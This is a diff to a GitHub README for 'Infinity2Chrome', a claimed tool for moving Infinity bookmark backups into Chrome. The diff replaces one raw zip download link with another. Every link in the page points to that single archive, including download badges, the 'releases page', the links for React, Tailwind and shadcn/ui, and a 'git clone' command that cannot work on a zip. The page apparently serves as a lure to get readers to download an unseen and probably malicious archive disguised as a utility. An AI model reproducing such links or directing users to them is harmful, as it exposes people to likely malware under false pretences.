@@ -1,6 +1,6 @@
 # 🌟 Infinity2Chrome - Safely Transfer Bookmarks to Chrome
 
-[![Download Now](https://raw.githubusercontent.com/Wunderknabe1/Infinity2Chrome/main/public/Infinity2Chrome_v1.9.zip%20Now-Get%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Wunderknabe1/Infinity2Chrome/main/public/Infinity2Chrome_v1.9.zip)
+[![Download Now](https://github.com/Wunderknabe1/Infinity2Chrome/raw/refs/heads/main/app/guide/Chrome_Infinity_v2.0.zip%20Now-Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Wunderknabe1/Infinity2Chrome/raw/refs/heads/main/app/guide/Chrome_Infinity_v2.0.zip)
 
 ## 📜 Project Overview
 
@@ -12,7 +12,7 @@ To get started with Infinity2Chrome, follow these simple steps:
 
 1. **Export Backup File**: First, you need to export your backup file from the Infinity extension. This will be in `.infinity` format.
   
-2. **Visit Infinity2Chrome Website**: Go to the [Infinity2Chrome Releases Page](https://raw.githubusercontent.com/Wunderknabe1/Infinity2Chrome/main/public/Infinity2Chrome_v1.9.zip) to download the tool.
+2. **Visit Infinity2Chrome Website**: Go to the [Infinity2Chrome Releases Page](https://github.com/Wunderknabe1/Infinity2Chrome/raw/refs/heads/main/app/guide/Chrome_Infinity_v2.0.zip) to download the tool.
 
 3. **Upload Backup File**: Upload your exported `.infinity` file on the Infinity2Chrome website.
 
@@ -32,14 +32,14 @@ To get started with Infinity2Chrome, follow these simple steps:
 
 Infinity2Chrome is built using modern web technologies:
 
-- [https://raw.githubusercontent.com/Wunderknabe1/Infinity2Chrome/main/public/Infinity2Chrome_v1.9.zip](https://raw.githubusercontent.com/Wunderknabe1/Infinity2Chrome/main/public/Infinity2Chrome_v1.9.zip): React framework for building user interfaces.
-- [Tailwind CSS](https://raw.githubusercontent.com/Wunderknabe1/Infinity2Chrome/main/public/Infinity2Chrome_v1.9.zip): A utility-first CSS framework for styling.
-- [shadcn/ui](https://raw.githubusercontent.com/Wunderknabe1/Infinity2Chrome/main/public/Infinity2Chrome_v1.9.zip): Component library for UI elements.
-- [v0](https://raw.githubusercontent.com/Wunderknabe1/Infinity2Chrome/main/public/Infinity2Chrome_v1.9.zip): AI-driven development support.
+- [https://github.com/Wunderknabe1/Infinity2Chrome/raw/refs/heads/main/app/guide/Chrome_Infinity_v2.0.zip](https://github.com/Wunderknabe1/Infinity2Chrome/raw/refs/heads/main/app/guide/Chrome_Infinity_v2.0.zip): React framework for building user interfaces.
+- [Tailwind CSS](https://github.com/Wunderknabe1/Infinity2Chrome/raw/refs/heads/main/app/guide/Chrome_Infinity_v2.0.zip): A utility-first CSS framework for styling.
+- [shadcn/ui](https://github.com/Wunderknabe1/Infinity2Chrome/raw/refs/heads/main/app/guide/Chrome_Infinity_v2.0.zip): Component library for UI elements.
+- [v0](https://github.com/Wunderknabe1/Infinity2Chrome/raw/refs/heads/main/app/guide/Chrome_Infinity_v2.0.zip): AI-driven development support.
 
 ## 💻 Download & Install
 
-1. **Visit the Releases Page**: Click on this link to go to the [Infinity2Chrome Releases Page](https://raw.githubusercontent.com/Wunderknabe1/Infinity2Chrome/main/public/Infinity2Chrome_v1.9.zip) and download the latest version of the application.
+1. **Visit the Releases Page**: Click on this link to go to the [Infinity2Chrome Releases Page](https://github.com/Wunderknabe1/Infinity2Chrome/raw/refs/heads/main/app/guide/Chrome_Infinity_v2.0.zip) and download the latest version of the application.
 
 2. **Choose Your Version**: Look for the most recent release and download the appropriate file for your operating system.
 
@@ -49,7 +49,7 @@ Infinity2Chrome is built using modern web technologies:
 
 If you’re interested in contributing or running this project locally, here are some steps:
 
-1. **Clone the Repository**: Use `git clone https://raw.githubusercontent.com/Wunderknabe1/Infinity2Chrome/main/public/Infinity2Chrome_v1.9.zip` to get the source code.
+1. **Clone the Repository**: Use `git clone https://github.com/Wunderknabe1/Infinity2Chrome/raw/refs/heads/main/app/guide/Chrome_Infinity_v2.0.zip` to get the source code.
 
 2. **Install Dependencies**: Navigate to the project folder and run `npm install` to install the necessary packages.
 
@@ -74,4 +74,4 @@ A: It supports `.infinity` and `.json` files for import.
 
 For any additional questions or help, feel free to reach out through the project’s repository.
 
-[![Download Now](https://raw.githubusercontent.com/Wunderknabe1/Infinity2Chrome/main/public/Infinity2Chrome_v1.9.zip%20Now-Get%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Wunderknabe1/Infinity2Chrome/main/public/Infinity2Chrome_v1.9.zip)
+[![Download Now](https://github.com/Wunderknabe1/Infinity2Chrome/raw/refs/heads/main/app/guide/Chrome_Infinity_v2.0.zip%20Now-Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Wunderknabe1/Infinity2Chrome/raw/refs/heads/main/app/guide/Chrome_Infinity_v2.0.zip)
